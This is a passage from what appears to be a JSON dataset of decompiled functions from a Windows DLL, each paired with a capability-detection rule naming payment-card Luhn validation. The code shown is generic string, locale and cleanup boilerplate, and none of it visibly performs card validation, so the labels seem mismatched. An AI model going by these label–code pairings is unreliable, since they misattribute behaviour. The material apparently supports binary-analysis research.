 uStack76 = puVar3[7];\n    uStack72 = *(puVar3 + 8);\n    uStack64 = puVar3[10];\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    puStack240 = 0x18007f79f;\n    iStack168 = arg1;\n    fcn.180074580(&stack0xffffffffffffff68);\n    cVar13 = uVar8;\n    puStack256 = 0x1800f454f;\n    if (cVar13 == '\\0') {\n        puStack256 = *(iStack280 + 0x10);\n    }\n    iVar6 = -1;\n    do {\n        iStack224 = iVar6;\n        iVar6 = iStack224 + 1;\n    } while (puStack256[iVar6] != '\\0');\n    iStack224 = iStack224 + 2;\n    puStack240 = 0x18007f7d0;\n    puStack376 = fcn.1800bb064(iStack224, 1);\n    if (puStack376 != NULL) {\n        if (iStack224 != 0) {\n            iVar6 = puStack376 - puStack256;\n            do {\n                puStack256[iVar6] = *puStack256;\n                puStack256 = puStack256 + 1;\n                iStack224 = iStack224 + -1;\n            } while (iStack224 != 0);\n        }\n        *(arg1 + 0x10) = puStack376;\n        puStack240 = 0x18007f80a;\n        uVar4 = fcn.180075da8(\"false\", 0, &stack0xffffffffffffff98);\n        *(arg1 + 0x20) = uVar4;\n        puStack240 = 0x18007f820;\n        uVar4 = fcn.180075da8(\"true\", 0, &stack0xffffffffffffff98);\n        *(arg1 + 0x28) = uVar4;\n        if (cVar13 == '\\0') {\n            *(arg1 + 0x18) = **(iStack280 + 0x58);\n            *(arg1 + 0x1a) = **(iStack280 + 0x60);\n        }\n        else {\n            uStack184 = 0x2e;\n            uStack176 = 0;\n            iStack168 = 0;\n            puStack200 = &stack0xffffffffffffff98;\n            puStack240 = 0x18007f853;\n            fcn.18006d768(&stack0xffffffffffffff50, &stack0xffffffffffffff48, 1);\n            *(arg1 + 0x18) = uStack176;\n            uStack184 = 0x2c;\n            uStack176 = 0;\n            iStack168 = 0;\n            puStack200 = &stack0xffffffffffffff98;\n            puStack240 = 0x18007f885;\n            fcn.18006d768(&stack0xffffffffffffff50, &stack0xffffffffffffff48, 1);\n            *(arg1 + 0x1a) = uStack176;\n        }\n        puStack240 = 0x18007f8b1;\n        fcn.18008fb00(uStack56 ^ &stack0xffffffffffffff18);\n        return;\n    }\n    puStack240 = 0x18007f8d7;\n    fcn.18006df20();\n    uStack264 = 0;\n    uStack272 = 1;\n    uStack368 = 0xfffffffffffffffe;\n    uStack296 = *0x180123080 ^ &stack0xfffffffffffffe30;\n    uStack416 = uStack192;\n    pcVar11 = CONCAT71(Stack183, uStack184);\n    uVar8 = CONCAT62(Stack174, uStack176);\n    if ((uVar8 == 0) || (uVar7 = 1,  (*pcVar11 - 0x2bU & 0xfd) != 0)) {\n        uVar7 = 0;\n    }\n    if (((((*(in_R9 + 0x18) & 0xe00) == 0x800) && (uVar7 + 2 <= uVar8)) && (pcVar11[uVar7] == '0')) &&\n       ((pcVar11[uVar7 + 1] + 0xa8U & 0xdf) == 0)) {\n        uVar7 = uVar7 + 2;\n    }\n    iVar6 = *(*(in_R9 + 0x40) + 8);\n    uStack392 = iVar6;\n    iStack384 = in_R9;\n    iStack248 = arg1;\n    puStack240 = &stack0xffffffffffffffa1;\n    (**0x1800de8f0)(iVar6);\n    uVar4 = fcn.180076930(&stack0xfffffffffffffe70);\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6);\n    }\n    uStack344 = 0;\n    uStack336 = 7;\n    uStack360 = 0;\n    if (uVar8 < 8) {\n        uStack344 = uVar8;\n        if (uVar8 != 0) {\n            puVar10 = &stack0xfffffffffffffe98;\n            for (uVar5 = uVar8; uVar5 != 0; uVar5 = uVar5 - 1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        *(&stack0xfffffffffffffe98 + uVar8 * 2) = 0;\n    }\n    else {\n        fcn.180075f80(&stack0xfffffffffffffe98, uVar8);\n    }\n    puVar12 = &stack0xfffffffffffffe98;\n    if (7 < uStack336) {\n        puVar12 = CONCAT62(Stack358, uStack360);\n    }\n    (**0x1800de8f0)(uVar4, pcVar11, pcVar11 + uVar8, puVar12);\n    iVar6 = *(*(in_R9 + 0x40) + 8);\n    uStack392 = iVar6;\n    (**0x1800de8f0)(iVar6);\n    uVar4 = fcn.180077b3c(&stack0xfffffffffffffe70);\n    iVar9 = 0;\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6, 1);\n    }\n    (**0x1800de8f0)(uVar4, &stack0xfffffffffffffeb8);\n    pcVar11 = &stack0xfffffffffffffeb8;\n    if (0xf < CONCAT44(uStack300, uStack304)) {\n        pcVar11 = CONCAT71(Stack327, cStack328);\n    }\n    if (*pcVar11 - 1U < 0x7e) {\n        (**0x1800de8f0)();\n        while (((cVar13 = *pcVar11,  cVar13 != '\\x7f' && ('\\0' < cVar13)) && (cVar13 < uVar8 - uVar7))) {\n            uVar8 = uVar8 - cVar13;\n            fcn.1800891dc(&stack0xfffffffffffffe98, uVar8, 1);\n            if ('\\0' < pcVar11[1]) {\n                pcVar11 = pcVar11 + 1;\n            }\n        }\n    }\n    uVar5 = uStack344;\n    uVar8 = *(in_R9 + 0x28);\n    iVar6 = iVar9;\n    if ((0 < uVar8) && (uStack344 < uVar8)) {\n        iVar6 = uVar8 - uStack344;\n    }\n    uVar2 = *(in_R9 + 0x18) & 0x1c0;\n    uStack400 = *in_R8;\n    uStack396 = in_R8[1];\n    uStack392._0_4_ = in_R8[2];\n    uStack392._4_4_ = in_R8[3];\n    uVar8 = uVar7;\n    if (uVar2 == 0x40) {\n        for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n            fcn.180078370(&stack0xfffffffffffffe70);\n            in_R9 = iStack384;\n        }\n    }\n    else if (uVar2 == 0x100) {\n        for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n            fcn.180078370(&stack0xfffffffffffffe70);\n            in_R9 = iStack384;\n        }\n        for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n            fcn.180078370(&stack0xfffffffffffffe70);\n        }\n        iVar6 = 0;\n    }\n    else {\n        for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n            fcn.180078370(&stack0xfffffffffffffe70);\n        }\n        for (; iVar6 = iVar9,  uVar8 != 0; uVar8 = uVar8 - 1) {\n            fcn.180078370(&stack0xfffffffffffffe70);\n            in_R9 = iStack384;\n        }\n    }\n    *in_R8 = uStack400;\n    in_R8[1] = uStack396;\n    in_R8[2] = uStack392;\n    in_R8[3] = uStack392._4_4_;\n    for (iVar9 = uVar5 - uVar7; iVar9 != 0; iVar9 = iVar9 + -1) {\n        fcn.180078370(&stack0xfffffffffffffe70);\n        in_R9 = iStack384;\n    }\n    *(in_R9 + 0x28) = 0;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        fcn.180078370(&stack0xfffffffffffffe70);\n    }\n    *puStack376 = uStack400;\n    puStack376[1] = uStack396;\n    puStack376[2] = uStack392;\n    puStack376[3] = uStack392._4_4_;\n    uVar8 = CONCAT44(uStack300, uStack304);\n    if (0xf < uVar8) {\n        iVar9 = CONCAT71(Stack327, cStack328);\n        iVar6 = iVar9;\n        if (0xfff < uVar8 + 1) {\n            iVar6 = *(iVar9 + -8);\n            if (0x1f < (iVar9 - iVar6) - 8U) {\n                fcn.1800b3528(iVar6, uVar8 + 0x28);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar6);\n    }\n    uStack312 = *0x180101910;\n    uStack308 = *0x180101914;\n    uStack304 = *0x180101918;\n    uStack300 = *0x18010191c;\n    cStack328 = '\\0';\n    fcn.180003e40(&stack0xfffffffffffffe98);\n    fcn.18008fb00(uStack296 ^ &stack0xfffffffffffffe30);\n    return;\n}\n",
        "token_count": 3253
    },
    "180082cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.180082cc0(ulong *arg1, ulong arg2, uint64_t arg3)\n\n{\n    ulong *arg1_00;\n    \n    if (arg3 < arg1[3] || arg3 == arg1[3]) {\n        arg1_00 = arg1;\n        if (7 < arg1[3]) {\n            arg1_00 = *arg1;\n        }\n        arg1[2] = arg3;\n        fcn.1800ade80(arg1_00, arg2, arg3 * 2);\n        *(arg3 * 2 + arg1_00) = 0;\n    }\n    else {\n        arg1 = fcn.180075e8c(arg1, arg3, arg3 & 0xffffffffffffff00, arg2);\n    }\n    return arg1;\n}\n",
        "token_count": 181
    },
    "18008370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_39h\n\nvoid fcn.18008370c(ulong arg1, uint *arg2, uint *arg3, ulong arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint *in_stack_00000038;\n    uchar auStack200 [32];\n    uint uStack168;\n    char **ppcStack160;\n    int32_t aiStack152 [2];\n    char *pcStack144;\n    int64_t iStack136;\n    ulong uStack128;\n    char acStack120 [31];\n    uint64_t var_51h;\n    ulong var_49h;\n    ulong var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_11h;\n    \n    uStack128 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack200;\n    iStack136 = *(*(in_stack_00000028 + 0x40) + 8);\n    (**0x1800de8f0)();\n    uStack168 = *(in_stack_00000028 + 0x18);\n    ppcStack160 = &pcStack144;\n    uVar4 = fcn.18007cb04(arg1, acStack120, arg3, arg4);\n    if (iStack136 != 0) {\n        iVar6 = (**0x1800de8f0)();\n        if (iVar6 != 0) {\n            (**0x1800de8f0)(iVar6, 1);\n        }\n    }\n    if (acStack120[0] == '\\0') {\n        *in_stack_00000030 = 2;\n        *in_stack_00000038 = 0;\n    }\n    else {\n        uVar5 = fcn.18008eb74(acStack120, &pcStack144, uVar4, aiStack152);\n        *in_stack_00000038 = uVar5;\n        if ((pcStack144 == acStack120) || (aiStack152[0] != 0)) {\n            *in_stack_00000030 = 2;\n        }\n    }\n    cVar3 = fcn.1800890e8(arg3, arg4);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 1;\n    }\n    uVar5 = arg3[1];\n    uVar1 = arg3[2];\n    uVar2 = arg3[3];\n    *arg2 = *arg3;\n    arg2[1] = uVar5;\n    arg2[2] = uVar1;\n    arg2[3] = uVar2;\n    fcn.18008fb00(stack0xffffffffffffffa8 ^ auStack200);\n    return;\n}\n",
        "token_count": 697
    },
    "18008444": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_39h\n\nvoid fcn.180084448(ulong arg1, uint *arg2, uint *arg3, ulong arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint *in_stack_00000038;\n    uchar auStack200 [32];\n    uint uStack168;\n    char **ppcStack160;\n    int32_t aiStack152 [2];\n    char *pcStack144;\n    int64_t iStack136;\n    ulong uStack128;\n    char acStack120 [31];\n    uint64_t var_51h;\n    ulong var_49h;\n    ulong var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_11h;\n    \n    uStack128 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack200;\n    iStack136 = *(*(in_stack_00000028 + 0x40) + 8);\n    (**0x1800de8f0)();\n    uStack168 = *(in_stack_00000028 + 0x18);\n    ppcStack160 = &pcStack144;\n    uVar4 = fcn.18007cfac(arg1, acStack120, arg3, arg4);\n    if (iStack136 != 0) {\n        iVar6 = (**0x1800de8f0)();\n        if (iVar6 != 0) {\n            (**0x1800de8f0)(iVar6, 1);\n        }\n    }\n    if (acStack120[0] == '\\0') {\n        *in_stack_00000030 = 2;\n        *in_stack_00000038 = 0;\n    }\n    else {\n        uVar5 = fcn.18008eb74(acStack120, &pcStack144, uVar4, aiStack152);\n        *in_stack_00000038 = uVar5;\n        if ((pcStack144 == acStack120) || (aiStack152[0] != 0)) {\n            *in_stack_00000030 = 2;\n        }\n    }\n    cVar3 = fcn.1800890e8(arg3, arg4);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 1;\n    }\n    uVar5 = arg3[1];\n    uVar1 = arg3[2];\n    uVar2 = arg3[3];\n    *arg2 = *arg3;\n    arg2[1] = uVar5;\n    arg2[2] = uVar1;\n    arg2[3] = uVar2;\n    fcn.18008fb00(stack0xffffffffffffffa8 ^ auStack200);\n    return;\n}\n",
        "token_count": 696
    },
    "18008967": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180089674(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a68;\n    iStackX24 = *0x180128a68;\n    if (*0x180128a30 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128a30 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128a30 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128a30;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128a30 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128a30 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180089ff4(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a68 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 613
    },
    "1800897a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800897a8(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a70;\n    iStackX24 = *0x180128a70;\n    if (*0x180128a38 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128a38 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128a38 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128a38;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128a38 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128a38 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18008a0b8(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a70 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 617
    },
    "1800898d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800898dc(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a78;\n    iStackX24 = *0x180128a78;\n    if (*0x180128a40 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128a40 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128a40 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128a40;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128a40 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128a40 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18008a17c(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a78 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 615
    },
    "180089a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180089a10(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a88;\n    iStackX24 = *0x180128a88;\n    if (*0x180128a50 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128a50 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128a50 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128a50;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128a50 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128a50 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18008a240(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a88 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 614
    },
    "180089b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180089b44(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a80;\n    iStackX24 = *0x180128a80;\n    if (*0x180128a48 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128a48 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128a48 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128a48;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128a48 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128a48 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18008a320(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a80 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 614
    },
    "180089c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180089c78(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a90;\n    iStackX24 = *0x180128a90;\n    if (*0x180128a58 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128a58 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128a58 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128a58;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128a58 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128a58 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18008a400(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a90 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 614
    },
    "180089da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180089dac(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a98;\n    iStackX24 = *0x180128a98;\n    if (*0x180128a60 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128a60 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128a60 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128a60;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128a60 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128a60 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18008a4f0(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a98 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 615
    },
    "18008f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18008f888(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    \n    if (*0x1801288b8 == 0) {\n        uVar1 = fcn.18008f91c(noname_0);\n        (**0x1800de3b8)(uVar1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n    }\n    else {\n        (**0x1800de8f0)(noname_0, arg2, arg3, arg4);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "18008f9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18008f9a0(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    \n    if (*0x1801288c8 == 0) {\n        uVar1 = fcn.18008f91c(noname_0);\n        (**0x1800de3b0)(uVar1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n    }\n    else {\n        (**0x1800de8f0)(noname_0, arg2, arg3, arg4);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "180090c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180090c50(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    \n    arg1 = (**0x1800de298)(0x180129110);\n    while (arg1 != NULL) {\n        puVar1 = *arg1;\n        fcn.1800b2bb8(arg1);\n        arg1 = puVar1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "180090c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180090c88(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x18010a140; piVar1 < 0x18010a140; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x1800de8f0)();\n        }\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "180090cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180090cc4(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x18010a150; piVar1 < 0x18010a150; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x1800de8f0)();\n        }\n    }\n    return;\n}\n",
        "token_count": 91
    },
